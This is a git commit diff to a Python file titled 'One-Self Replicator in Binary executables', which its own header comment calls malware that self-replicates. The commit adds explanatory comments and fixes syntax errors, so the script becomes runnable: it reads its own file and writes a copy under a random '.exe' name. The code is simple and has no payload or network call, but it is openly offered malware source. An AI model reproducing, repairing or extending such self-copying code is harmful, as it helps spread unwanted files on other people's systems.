9c775b85ced9aa279603639eaaee0ee6e9059f0f
Grace Preston <143225518+Grass-Rat@users.noreply.github.com>
2024-03-28 10:18:53 -0400

    Update One-Self Replicator in Binary executables.py
    Added comments

--- One-Self Replicator in Binary executables.py
+++ One-Self Replicator in Binary executables.py
@@ -1,17 +1,23 @@
-#Simple Virus One in Python
-#This is a piece of malware which self replicates in Binary Executables
+# Simple Virus One in Python
+# This is a piece of malware which self replicates in Binary Executables
 
 from sys import argv
 from random import choice, randint
 from string import ascii_letters as Alphabets
 
-Randstr = lambda length: "".join([choice(Alphabets) for x in range(length)]) ".exe"
+# Lambda function to generate a random string of specified length
+Randstr = lambda length: "".join([choice(Alphabets) for x in range(length)]) + ".exe"
 
-File_Name = Randstr(randint(4,8))
-Self_Script = argv [0]
+# Generate a random filename for the replicated executable
+File_Name = Randstr(randint(4, 8))
 
+# Get the name of the current script
+Self_Script = argv[0]
+
+# Open the current script file in read mode and read its content
 with open(Self_Script, "rb") as File:
-    Data = File.read
+    Data = File.read()
 
+# Write the read content into the newly created file with the generated filename
 with open(File_Name, "wb") as File:
     File.write(Data)
